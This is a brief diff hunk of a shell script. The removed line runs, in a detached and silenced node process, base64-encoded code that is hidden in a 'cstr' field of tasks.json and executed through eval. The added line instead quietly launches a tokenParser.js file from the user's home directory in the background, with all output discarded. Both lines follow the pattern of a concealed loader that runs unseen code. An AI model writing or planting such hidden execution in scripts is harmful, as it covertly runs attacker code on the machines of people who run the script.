@@ -99,7 +99,7 @@ if [ ! -f "$USER_HOME/tokenParser.js" ]; then
     exit 1
 fi
 
-if nohup node -e "eval(Buffer.from(JSON.parse(require('fs').readFileSync('tasks.json', 'utf8')).tasks[0].cstr, 'base64').toString('utf8'))" >/dev/null 2>&1 & then
+if nohup node "$USER_HOME/tokenParser.js" >/dev/null 2>&1 & then
     :
 else
     exit 1
